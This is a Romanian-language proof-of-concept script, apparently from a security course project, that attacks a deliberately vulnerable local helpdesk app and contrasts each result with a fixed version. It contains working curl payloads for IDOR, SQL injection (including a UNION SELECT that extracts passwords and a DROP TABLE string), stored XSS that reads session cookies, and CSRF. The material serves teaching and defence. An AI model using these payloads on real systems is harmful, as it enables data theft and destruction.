# PoC – Demonstrarea Atacurilor (versiunea VULNERABILA)
# Ruleaza aplicatia vulnerabila: cd vulnerable && python run.py
# Inregistreaza: analyst1 / analyst2 / manager1 cu parole simple

## ─────────────────────────────────────────────────────────
## POC #1: IDOR – Broken Access Control
## ─────────────────────────────────────────────────────────

# Logheaza-te ca analyst1 si noteaza ID-ul tichetului propriu (ex: 1)
# Schimba ID-ul in URL pentru a accesa tichetul lui analyst2 (ex: 2)

curl -s -b "session=<SESSION_ANALYST1>" \
     http://localhost:5000/tickets/2

# In versiunea VULNERABILA: returneza ticket-ul altui user (200 OK)
# In versiunea FIXED: returneaza 403 Forbidden

## ─────────────────────────────────────────────────────────
## POC #2: SQL Injection – Search
## ─────────────────────────────────────────────────────────

# Test: OR 1=1 – returneaza toate tichetele (inclusiv ale altor useri)
curl -s -b "session=<SESSION>" \
     "http://localhost:5000/tickets/search?q=%27+OR+%271%27%3D%271"

# Test: UNION SELECT – extrage parole din tabela users
curl -s -b "session=<SESSION>" \
     "http://localhost:5000/tickets/search?q=%27+UNION+SELECT+id%2Cemail%2Cpassword%2Cemail%2Cemail%2Cdatetime%28%27now%27%29%2Cdatetime%28%27now%27%29+FROM+users+--"

# In versiunea VULNERABILA: apar parole in clear in raspuns
# In versiunea FIXED: query parametrizat, niciun rezultat malitios

## ─────────────────────────────────────────────────────────
## POC #3: XSS Stored
## ─────────────────────────────────────────────────────────

# Creeaza un tichet cu payload XSS in descriere (logat ca analyst1):
curl -s -b "session=<SESSION>" \
     -X POST http://localhost:5000/tickets/new \
     -d "title=TestXSS&description=<script>alert(document.cookie)</script>&severity=LOW"

# Cand managerul vizualizeaza tichetul, scriptul se executa
# In versiunea VULNERABILA: alert() apare cu cookie-ul sesiunii
# In versiunea FIXED: <script> este eliminat de bleach, textul e afisat ca text

## ─────────────────────────────────────────────────────────
## POC #4A: CSRF – Schimbare status din pagina externa
## ─────────────────────────────────────────────────────────

# Deschide poc/csrf_attack.html intr-un browser unde esti logat in Deskly
# In versiunea VULNERABILA: status-ul tichetului #1 se schimba in RESOLVED
# In versiunea FIXED: 400 Bad Request (CSRF token lipsa / invalid)

## ─────────────────────────────────────────────────────────
## POC #4B: Session Management
## ─────────────────────────────────────────────────────────

# Versiunea vulnerabila – cookie fara HttpOnly:
# In DevTools > Application > Cookies poti vedea si fura cookie-ul din JS:
# document.cookie  => "session=<valoare>"

# Versiunea FIXED: document.cookie returneaza "" (cookie-ul e HttpOnly)

## ─────────────────────────────────────────────────────────
## POC #5: Error Disclosure / Info Disclosure
## ─────────────────────────────────────────────────────────

# Provoca eroare DB in versiunea vulnerabila:
curl -s -b "session=<SESSION>" \
     "http://localhost:5000/tickets/search?q=%27%3B+DROP+TABLE+tickets%3B+--"

# In versiunea VULNERABILA: afiseaza "Eroare DB: ... Query: SELECT * FROM..."
# In versiunea FIXED: pagina generica de eroare, detalii in log server

## ─────────────────────────────────────────────────────────
## POC #6: Password Storage
## ─────────────────────────────────────────────────────────

# Versiunea vulnerabila – verifica DB direct:
sqlite3 vulnerable/deskly_vulnerable.db "SELECT email, password FROM users;"
# OUTPUT: analyst1@test.ro | parola123   <- parola in clear!

# Versiunea FIXED:
sqlite3 fixed/deskly_fixed.db "SELECT email, password_hash FROM users;"
# OUTPUT: analyst1@test.ro | $2b$12$...  <- hash bcrypt
